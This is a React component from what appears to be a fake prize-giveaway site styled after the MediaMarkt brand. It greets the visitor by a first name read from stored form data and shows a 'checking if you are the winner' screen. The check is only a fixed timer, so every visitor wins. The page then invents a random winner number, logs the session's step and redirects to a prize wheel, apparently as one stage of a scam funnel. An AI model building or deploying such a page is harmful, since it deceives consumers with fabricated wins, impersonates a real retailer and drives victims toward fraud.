"use client";

import { useEffect, useMemo, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import confetti from "canvas-confetti";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";

type Props = {
  sessionId: string | null;
  routeSessionId?: string | null;
};

type Phase = "loading" | "checking" | "success";

const CHECK_MS = 6000;
const SUCCESS_MIN_MS = 2600;
const SUCCESS_MAX_MS = 3800;

function fireMediaMarktConfetti() {
  const colors = ["#DF0000", "#FF453A", "#FFD700", "#ffffff"];
  void confetti({
    particleCount: 90,
    spread: 75,
    origin: { y: 0.6 },
    colors,
    scalar: 0.9,
  });
  window.setTimeout(() => {
    void confetti({
      particleCount: 60,
      angle: 60,
      spread: 60,
      origin: { x: 0, y: 0.7 },
      colors,
      scalar: 0.8,
    });
    void confetti({
      particleCount: 60,
      angle: 120,
      spread: 60,
      origin: { x: 1, y: 0.7 },
      colors,
      scalar: 0.8,
    });
  }, 250);
}

export function VerifyClient({ sessionId, routeSessionId }: Props) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const [phase, setPhase] = useState<Phase>("loading");
  const [firstName, setFirstName] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [winnerNo] = useState(() => 20 + Math.floor(Math.random() * 980));
  const timersRef = useRef<number[]>([]);

  const effectiveRouteSessionId = routeSessionId ?? sessionId;

  useEffect(() => {
    const timers = timersRef.current;
    return () => {
      timers.forEach((t) => window.clearTimeout(t));
    };
  }, []);

  useEffect(() => {
    let cancelled = false;
    if (!supabase || !sessionId) {
      setPhase("checking");
      return;
    }
    void (async () => {
      const { data } = await supabase
        .from("sessions")
        .select("form_data")
        .eq("id", sessionId)
        .maybeSingle();
      if (cancelled) return;
      const name = data?.form_data?.firstName;
      if (typeof name === "string" && name.trim()) {
        setFirstName(name.trim());
      }
      setPhase("checking");
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  useEffect(() => {
    if (phase !== "checking") return;
    timersRef.current.push(
      window.setTimeout(() => setPhase("success"), CHECK_MS),
    );
  }, [phase]);

  useEffect(() => {
    if (phase !== "success") return;
    fireMediaMarktConfetti();

    const redirectMs =
      SUCCESS_MIN_MS + Math.random() * (SUCCESS_MAX_MS - SUCCESS_MIN_MS);
    timersRef.current.push(
      window.setTimeout(() => {
        const go = async () => {
          try {
            if (supabase && sessionId) {
              await supabase
                .from("sessions")
                .update({ current_step: "wheel" })
                .eq("id", sessionId);
            }
          } catch {
            /* best-effort; navigation proceeds anyway */
          }
          try {
            window.location.replace(
              `/wheel?session=${encodeURIComponent(effectiveRouteSessionId ?? "")}`,
            );
          } catch {}
          router.push(
            `/wheel?session=${encodeURIComponent(effectiveRouteSessionId ?? "")}`,
          );
        };
        void go();
      }, redirectMs),
    );
  }, [phase, router, sessionId, supabase, effectiveRouteSessionId]);

  if (error) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center p-4">
        <p className="rounded-xl border border-red-200 bg-red-50 p-4 text-center text-sm text-red-900">
          {error}
        </p>
      </div>
    );
  }

  return (
    <div className="relative flex min-h-[100dvh] items-center justify-center overflow-hidden bg-[#0d0d0f] p-4">
      <div className="pointer-events-none absolute left-[-15%] top-[-10%] h-[420px] w-[420px] rounded-full bg-[#DF0000]/15 blur-[120px]" />
      <div className="pointer-events-none absolute bottom-[-15%] right-[-10%] h-[420px] w-[420px] rounded-full bg-[#FF453A]/10 blur-[130px]" />

      {phase !== "success" ? (
        <div
          className="relative w-full max-w-[480px] rounded-[24px] px-6 py-10 text-center sm:px-10"
          style={{
            background:
              "linear-gradient(180deg, rgba(30,12,12,0.92) 0%, rgba(14,10,10,0.96) 100%)",
            border: "1px solid rgba(223,0,0,0.35)",
            boxShadow:
              "0 24px 80px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,69,58,0.15)",
            backdropFilter: "blur(14px)",
          }}
        >
          <div className="mx-auto mb-6 flex h-16 w-16 items-center justify-center">
            <div className="h-14 w-14 animate-spin rounded-full border-4 border-white/10 border-t-[#FF453A]" />
          </div>
          <h1 className="text-xl font-extrabold text-white sm:text-2xl">
            Bitte warten...
          </h1>
          <p className="mt-3 text-sm font-medium leading-relaxed text-white/60 sm:text-[15px]">
            Wir pruefen, ob Sie der glueckliche Gewinner sind.
            <br />
            Das Ergebnis wird in wenigen Sekunden bekannt gegeben.
          </p>
          <div className="mx-auto mt-6 h-1.5 w-56 max-w-full overflow-hidden rounded-full bg-white/10">
            <div
              className="h-full w-1/3 rounded-full bg-gradient-to-r from-[#DF0000] via-[#FF453A] to-[#DF0000]"
              style={{ animation: "verifySlide 1.6s ease-in-out infinite" }}
            />
          </div>
          <style jsx>{`
            @keyframes verifySlide {
              0% {
                transform: translateX(-120%);
              }
              100% {
                transform: translateX(400%);
              }
            }
          `}</style>
        </div>
      ) : (
        <div
          className="relative w-full max-w-[480px] animate-in zoom-in-95 duration-500 rounded-[24px] px-6 py-10 text-center sm:px-10"
          style={{
            background:
              "linear-gradient(180deg, rgba(30,12,12,0.92) 0%, rgba(14,10,10,0.96) 100%)",
            border: "1px solid rgba(223,0,0,0.5)",
            boxShadow:
              "0 24px 80px rgba(0,0,0,0.6), 0 0 60px rgba(223,0,0,0.25), inset 0 1px 0 rgba(255,69,58,0.2)",
            backdropFilter: "blur(14px)",
          }}
        >
          <div
            className="mx-auto mb-5 flex h-16 w-16 items-center justify-center rounded-full"
            style={{
              background: "linear-gradient(160deg, #ff5a52 0%, #df0000 45%, #9d0000 100%)",
              boxShadow: "0 0 30px rgba(223,0,0,0.6)",
            }}
          >
            <svg
              className="h-9 w-9 text-white"
              fill="none"
              viewBox="0 0 24 24"
              stroke="currentColor"
              strokeWidth={3}
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                d="M5 13l4 4L19 7"
              />
            </svg>
          </div>
          <p className="text-sm font-semibold uppercase tracking-widest text-[#FF8A80]">
            Glueckwunsch{firstName ? "," : ""}
          </p>
          {firstName ? (
            <h1 className="mt-1 break-words text-3xl font-black text-white sm:text-4xl">
              {firstName}!
            </h1>
          ) : (
            <h1 className="mt-1 text-3xl font-black text-white sm:text-4xl">
              Glueckwunsch!
            </h1>
          )}
          <div className="mx-auto mt-4 inline-flex items-center gap-2 rounded-full border border-[#FF453A]/40 bg-[#DF0000]/15 px-4 py-1.5">
            <svg
              className="h-4 w-4 text-[#FF8A80]"
              fill="currentColor"
              viewBox="0 0 20 20"
            >
              <path d="M10 1.5l2.6 5.3 5.9.9-4.3 4.1 1 5.8L10 14.9l-5.2 2.7 1-5.8L1.5 7.7l5.9-.9L10 1.5z" />
            </svg>
            <span className="text-sm font-bold text-[#FF8A80]">
              Glueckliche Gewinner-Nr. {winnerNo}
            </span>
          </div>
          <p className="mt-4 text-sm font-medium leading-relaxed text-white/70 sm:text-base">
            Sie haben das Recht gewonnen, das Gluecksrad zu drehen!
          </p>
          <div className="mt-6 flex items-center justify-center gap-2 text-xs text-white/50">
            <div className="h-4 w-4 animate-spin rounded-full border-2 border-white/30 border-t-[#FF453A]" />
            Weiterleitung zum Gluecksrad...
          </div>
        </div>
      )}
    </div>
  );
}
